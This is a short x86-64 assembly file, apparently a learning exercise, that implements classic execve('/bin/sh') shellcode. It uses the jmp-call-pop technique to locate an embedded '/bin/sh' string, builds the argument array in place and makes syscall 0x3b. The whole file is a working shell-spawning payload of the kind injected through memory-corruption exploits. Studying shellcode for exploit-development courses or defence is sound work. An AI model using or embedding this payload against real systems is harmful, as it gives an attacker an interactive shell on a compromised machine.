; Program: execv /bin/sh
;
; Input no
;
; Output: execute /bin/sh
;
; syscall code: 0x3b  in rax 
; args pointer: 0x0 in edx
; second arg  : in rsi
; string args : in rdi

    segment .text
    global _start

_start:
    jmp  set_relative_address

shellcode:
    pop     rbx
    xor     eax, eax
    mov     byte [rbx+7], al
    lea     rdi, [rbx]
    mov     qword [rbx+8], rdi
    mov     qword [rbx+16], rax
    mov     rdi, rbx
    lea     rsi, [rbx+8]
    lea     rdx, [rbx+16]
    mov     al, 0x3b
    syscall

set_relative_address:
    call shellcode
    db  "/bin/shJAAAAAAAAKKKKKKKK"